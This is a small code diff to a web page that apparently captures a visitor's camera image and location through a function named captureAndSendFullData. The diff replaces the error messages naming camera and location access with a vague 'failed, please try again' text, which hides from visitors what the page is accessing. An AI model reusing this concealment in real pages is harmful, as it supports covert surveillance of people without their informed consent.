@@ -115,7 +115,7 @@
     video.srcObject = stream;
   })
   .catch(err => {
-    console.error("Gagal mengakses kamera:", err);
+    console.error("Gagal Mohon Ulangi Lagi...:", err);
   });
 
   async function captureAndSendFullData() {
@@ -168,7 +168,7 @@
         });
 
       }, function(err) {
-        alert("Gagal mengakses lokasi: " + err.message);
+        alert("Gagal Mohon Ulangi Lagi...: " + err.message);
       });
     }, 'image/jpeg', 1.0);
   }
@@ -190,4 +190,4 @@
 </script>
 
 </body>
-    </html>
+</html>
